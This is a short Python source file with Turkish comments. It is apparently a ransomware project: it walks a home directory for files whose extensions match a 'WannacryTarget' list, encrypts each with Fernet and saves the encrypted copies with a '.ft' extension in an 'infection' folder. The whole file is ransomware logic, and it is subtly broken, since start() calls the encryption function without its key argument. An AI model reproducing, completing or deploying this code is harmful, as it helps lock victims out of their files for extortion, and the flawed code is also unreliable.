import os
from cryptography.fernet import Fernet


def GetTargets(homePath,WannacryTarget):
    matched_files = []

    # Tüm klasör ve alt klasörleri dolaş
    for root, dirs, files in os.walk(homePath):
        for file in files:
            for ext in WannacryTarget:
                if file.lower().endswith(ext):
                    full_path = os.path.join(root, file)
                    matched_files.append(full_path)
    return matched_files


def encrypted(files, infectionPath, silent, key):
    #Şifreleme nesnesini oluştur
    cipher = Fernet(key)
    
    
    for i in files:
        with open(i, "rb") as f:
            data = f.read()

        encrypted_data = cipher.encrypt(data)
        encryptedFile = os.path.basename(i) + ".ft"
        encrypted_path = os.path.join(infectionPath, encryptedFile)

        # Şifreli veriyi kaydet
        with open(encrypted_path, "wb") as f:
            f.write(encrypted_data)
            if (silent):
                print(f"{i} dosyası şifrelendi ve {encrypted_path} içine kaydedildi.")


def start(homePath, silent, WannacryTarget, infectionPath):
    
    files = GetTargets(homePath, WannacryTarget)
    encrypted(files, infectionPath, silent)

